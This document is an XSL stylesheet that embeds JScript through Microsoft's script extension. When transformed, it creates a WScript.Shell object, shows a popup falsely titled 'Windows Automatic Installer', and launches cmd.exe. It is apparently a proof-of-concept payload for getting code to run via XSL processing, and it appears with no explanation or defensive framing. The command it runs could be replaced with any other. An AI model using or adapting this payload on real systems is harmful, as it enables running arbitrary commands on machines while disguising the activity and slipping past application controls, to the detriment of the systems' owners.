<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
	<![CDATA[
	    var sh = new ActiveXObject("Wscript.Shell");
	    sh.Popup("Windows Automatic Installer");
            sh.Run("cmd.exe");
        ]]> </ms:script>
</stylesheet>
